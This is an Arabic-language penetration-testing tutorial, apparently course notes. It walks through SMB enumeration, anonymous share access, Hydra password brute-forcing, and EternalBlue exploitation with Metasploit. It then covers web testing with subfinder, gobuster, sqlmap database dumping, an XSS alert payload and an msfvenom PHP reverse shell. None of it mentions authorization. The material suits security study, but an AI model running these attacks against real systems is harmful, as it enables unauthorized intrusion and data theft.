## 🔥 **شرح عميق وبسيط لـ SMB Enumeration + خطوات عملية لـ Web Pentesting**

هنا هشرح **SMB Enumeration** بالتفصيل مع كل حاجة ممكن تستغلها فيه، وبعدها هديك **خطوات عملية كاملة لاختبار اختراق الويب (Web Pentesting)** خطوة بخطوة.

---

# **🛠 1. يعني إيه SMB؟**

🔹 **SMB (Server Message Block)** هو بروتوكول بيتم استخدامه في **Windows و Linux** لمشاركة الملفات والطابعات والموارد بين الأجهزة في الشبكة.  
🔹 أي جهاز فيه SMB شغال ممكن يكون فيه **ملفات حساسة، أسماء مستخدمين، أو حتى ثغرات خطيرة** تقدر تستغلها وتخترقه.

🟢 **الخلاصة بالعامية المصرية:**  
SMB ده بروتوكول بيخلّي الأجهزة تشارك الملفات في الشبكة، ولو مش مأمن كويس، ممكن نلاقي فيه حاجات مفيدة زي ملفات أو ثغرات.

---

# **🔍 2. ازاي تعرف إن SMB شغال على السيرفر؟**

### ✅ **استخدام Nmap لفحص بورتات SMB**

SMB بيشتغل على:

- **بورت 139** (NetBIOS Session Service)
- **بورت 445** (Direct SMB)

🔹 نشوف هل السيرفر مشغل SMB ولا لأ:

```bash
nmap -p 139,445 --script=smb-os-discovery target.com
```

🔹 لو لقينا البورتات مفتوحة، نكمل الاستكشاف.

🟢 **الخلاصة بالعامية المصرية:**  
هنستخدم **Nmap** عشان نشوف هل السيرفر مشغل SMB ولا لأ.

---

# **🔎 3. معرفة إصدار SMB وثغراته**

لو السيرفر بيستخدم **إصدار قديم من SMB**، ممكن يكون فيه ثغرات زي:

- **SMBv1** (فيه ثغرة **EternalBlue**)
- **SMBv2 و SMBv3** (ممكن يكون فيها ثغرات برضه)

### ✅ **فحص إصدار SMB**

```bash
nmap --script=smb-protocols -p 139,445 target.com
```

### ✅ **لو SMBv1 موجود، نشوف إذا كان مصاب بـ EternalBlue**

```bash
nmap --script=smb-vuln-ms17-010 -p 445 target.com
```

🔹 لو طلع مصاب، ممكن نستخدم **Metasploit** لاختراقه.

🟢 **الخلاصة بالعامية المصرية:**  
هنشوف إصدار SMB ولو كان قديم، ممكن يكون فيه ثغرات نقدر نستغلها.

---

# **📂 4. استكشاف الملفات المشتركة (SMB Shares Enumeration)**

🔹 بعض السيرفرات بتكون فيها **مجلدات وملفات مشتركة بدون باسورد**!

### ✅ **نستخدم smbclient لاستعراض الملفات المشتركة**

```bash
smbclient -L //target.com
```

🔹 لو فيه مشاركة مفتوحة، نجرب ندخل بدون باسورد:

```bash
smbclient //target.com/sharename -U anonymous
```

🔹 لو دخلنا، نستخدم الأوامر دي:

```bash
ls   # استعراض الملفات
cd foldername  # دخول مجلد معين
get file.txt  # تحميل ملف
```

🟢 **الخلاصة بالعامية المصرية:**  
هنشوف لو في ملفات مشتركة ممكن ندخل عليها، ولو مفيش باسورد، ممكن نلاقي بيانات حساسة.

---

# **🔑 5. تجربة كسر كلمات المرور (Brute Force Attack)**

لو عندنا أسماء مستخدمين، ممكن نحاول **نخمن الباسورد** وندخل.

### ✅ **استخدام Hydra لتخمين كلمات المرور**

```bash
hydra -L users.txt -P passwords.txt smb://target.com
```

🔹 `users.txt` فيها أسماء المستخدمين، و`passwords.txt` فيها كلمات المرور اللي هنحاولها.

🟢 **الخلاصة بالعامية المصرية:**  
لو السيرفر مش مأمن كويس، ممكن نخمن الباسورد وندخل على الملفات المشتركة!

---

# **💀 6. استغلال ثغرة EternalBlue (لو SMBv1 موجود)**

🔹 **EternalBlue** هي ثغرة خطيرة بتسمح لنا بالتحكم في السيرفر.  
🔹 لو السيرفر مصاب، ممكن نستخدم **Metasploit** لاختراقه.

### ✅ **استخدام Metasploit لاختراق SMB بـ EternalBlue**

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST your-ip
exploit
```

🔹 لو نجح الهجوم، هتاخد جلسة **Meterpreter** وتتحكم في الجهاز!

🟢 **الخلاصة بالعامية المصرية:**  
لو SMBv1 موجود وفيه ثغرة EternalBlue، ممكن نستخدم Metasploit عشان نتحكم في السيرفر بالكامل.

---
# ##ملحوظه (من شرح الكورس )

####  
### ممكن تستخدم الاداه دي برضه enum4linux لو لقيت ال  مفتوح


```bash
enum4linux targetip
```

# **🚀 💣 خطوات عملية كاملة لاختبار اختراق الويب (Web Pentesting) 💣**

## **🛠️ 1. جمع المعلومات (Reconnaissance)**

🔹 بنبدأ بالبحث عن **المجالات الفرعية، الملفات، المجلدات، التكنولوجيا المستخدمة، والثغرات المحتملة**.

### ✅ **استخدام Subfinder و Assetfinder لجمع النطاقات الفرعية**

```bash
subfinder -d target.com
assetfinder --subs-only target.com
```

### ✅ **استخدام Nmap لفحص البورتات والخدمات**

```bash
nmap -A -T4 target.com
```

### ✅ **استخدام WhatWeb لمعرفة التكنولوجيا المستخدمة**

```bash
whatweb target.com
```

🟢 **الخلاصة بالعامية المصرية:**  
هنجمع معلومات عن السيرفر زي النطاقات الفرعية، الخدمات، والتكنولوجيا اللي بيستخدمها.

---

## **🛠️ 2. البحث عن المجلدات والملفات المخفية**

🔹 أحيانًا بيكون فيه **ملفات مهمة مخفية** زي **admin panels أو config files**.

### ✅ **استخدام Gobuster للبحث عن المجلدات**

```bash
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

🟢 **الخلاصة بالعامية المصرية:**  
هنشوف لو فيه صفحات أو مجلدات مخفية ممكن نستغلها.

---

## **🛠️ 3. اختبار ثغرات SQL Injection**

🔹 بنجرب **إدخال أوامر SQL** عشان نتحكم في قاعدة البيانات.

### ✅ **استخدام sqlmap لفحص وإكسبلويت الثغرات**

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

🟢 **الخلاصة بالعامية المصرية:**  
هنجرب نشوف لو الموقع فيه ثغرة SQL Injection تخليه يعرض بيانات حساسة.

---

## **🛠️ 4. تجربة XSS (Cross-Site Scripting)**

🔹 نشوف هل الموقع بيتعامل مع الإدخال بطريقة غير آمنة؟

### ✅ **اختبار إدخال JavaScript ضار**

```html
<script>alert("Hacked!")</script>
```

🟢 **الخلاصة بالعامية المصرية:**  
هنشوف لو نقدر نشغل كود JavaScript في الموقع عشان نسرق بيانات المستخدمين.

---

## **🛠️ 5. تجربة رفع الملفات الضارة (File Upload Exploitation)**

🔹 لو الموقع بيسمح برفع ملفات، ممكن نحاول نرفع **ملف PHP reverse shell**.

### ✅ **إنشاء Reverse Shell باستخدام msfvenom**

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=your-ip LPORT=4444 -f raw > shell.php
```

🟢 **الخلاصة بالعامية المصرية:**  
هنشوف لو الموقع بيسمح برفع ملفات خبيثة عشان ناخد صلاحيات على السيرفر.

---

🚀 **بكده عندك دليل كامل لاختبار اختراق SMB والويب من الصفر لحد الاستغلال الكامل! 🔥💀**